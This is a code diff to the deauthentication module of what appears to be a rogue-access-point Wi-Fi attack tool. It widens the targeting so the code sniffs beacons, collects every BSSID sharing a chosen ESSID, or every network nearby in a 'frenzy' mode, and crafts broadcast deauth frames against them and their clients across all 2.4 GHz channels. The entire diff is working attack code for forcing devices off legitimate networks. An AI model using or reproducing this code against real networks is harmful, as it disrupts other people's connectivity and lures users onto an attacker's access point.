@@ -29,7 +29,8 @@ class Deauth(object):
         self._observed_clients = set()
         self._should_continue = True
         self._data = data
-        self._first_run = True
+        # the bssids having the same ESSID
+        self._deauth_bssids = set()
 
     @staticmethod
     def _craft_packet(sender, receiver, bssid):
@@ -77,9 +78,38 @@ class Deauth(object):
 
         # return the correct bssid based on the type
         return ((not to_ds and not from_ds and packet.addr3) or
-                (not to_ds and from_ds and packet.addr1) or
-                (to_ds and not from_ds and packet.addr2) or
+                (not to_ds and from_ds and packet.addr2) or
+                (to_ds and not from_ds and packet.addr1) or
                 None)
+
+    def _is_attacking_bssid(self, packet):
+        """
+        Check if this is the target attacking bssid
+        :param self: A Deauth object
+        :param packet: A scapy.layers.RadioTap object
+        :type self: Deauth
+        :type packet: scapy.layers.RadioTap
+        :return: True if this is the target attacking bssid else False
+        :rtype: bool
+        """
+
+        if (packet.addr3 != self._data.rogue_ap_mac and packet.addr3
+                not in self._deauth_bssids):
+            try:
+                essid = packet[dot11.Dot11Elt].info.decode("utf8")
+            except UnicodeDecodeError:
+                return False
+
+            # only compare essid when -dE is given
+            return ((self._data.args.deauth_essid and
+                     essid == self._data.target_ap_essid) or
+                    # frenzy deauth
+                    (not self._data.args.deauth_essid and
+                     not self._data.target_ap_bssid) or
+                    # target_ap_bssid without -dE option
+                    (not self._data.args.deauth_essid and
+                     self._data.target_ap_bssid == packet.addr3) or
+                    False)
 
     def get_packet(self, packet):
         """
@@ -108,41 +138,35 @@ class Deauth(object):
         except AttributeError:
             return ([], [])
 
-        # when --essid is used we don't have target_ap_bssid
-        if self._data.target_ap_bssid:
-            # we need to create this packet only once
-            if self._first_run:
-                # Craft and add deauth/disas packet to broadcast address
-                packets_to_send += self._craft_packet(self._data.target_ap_bssid,
-                                                      constants.WIFI_BROADCAST,
-                                                      self._data.target_ap_bssid)
-                self._first_run = False
+        # obtain the channel for this packet
+        try:
+            # channel is in the third IE of Dot11Elt
+            channel = ord(packet[dot11.Dot11Elt][2].info)
 
-            bssid = self._data.target_ap_bssid
-            channels.append(self._data.target_ap_channel)
-        else:
-            bssid = self._extract_bssid(packet)
-
-            # Do not send deauth for our rogue access point
-            if bssid == self._data.rogue_ap_mac:
+            # check if this is valid channel
+            if channel not in constants.ALL_2G_CHANNELS:
                 return ([], [])
 
-            # obtain the channel for this packet
-            try:
-                # channel is in the third IE of Dot11Elt
-                channel = ord(packet[dot11.Dot11Elt][2].info)
+            channels.append(str(channel))
+        except (TypeError, IndexError):
+            # just return empty channel and packet
+            return ([], [])
 
-                # check if this is valid channel
-                if channel not in constants.ALL_2G_CHANNELS:
-                    return ([], [])
+        bssid = self._extract_bssid(packet)
+        # check beacon if this is our target deauthing BSSID
+        if (packet.haslayer(dot11.Dot11Beacon) and bssid not in self._deauth_bssids
+                and self._is_attacking_bssid(packet)):
+            # listen beacon to get the target attacking BSSIDs for the
+            # specified ESSID
+            packets_to_send += self._craft_packet(bssid,
+                                                  constants.WIFI_BROADCAST,
+                                                  bssid)
+            self._deauth_bssids.add(bssid)
 
-                channels.append(str(channel))
-            except (TypeError, IndexError):
-                # just return empty channel and packet
-                return ([], [])
+        if bssid not in self._deauth_bssids:
+            return ([], [])
 
         clients = self._add_clients(sender, receiver, bssid)
-
         if clients:
             self._observed_clients.add(clients[0])
             packets_to_send += clients[1]
@@ -203,6 +227,6 @@ class Deauth(object):
         :rtype: list
         """
 
-        # return target's channel if available otherwise all channels
-        return ([self._data.target_ap_channel] if self._data.target_ap_bssid else
-                map(str, constants.ALL_2G_CHANNELS))
+        if self._data.target_ap_bssid and not self._data.args.deauth_essid:
+            return [self._data.target_ap_channel]
+        return map(str, constants.ALL_2G_CHANNELS)
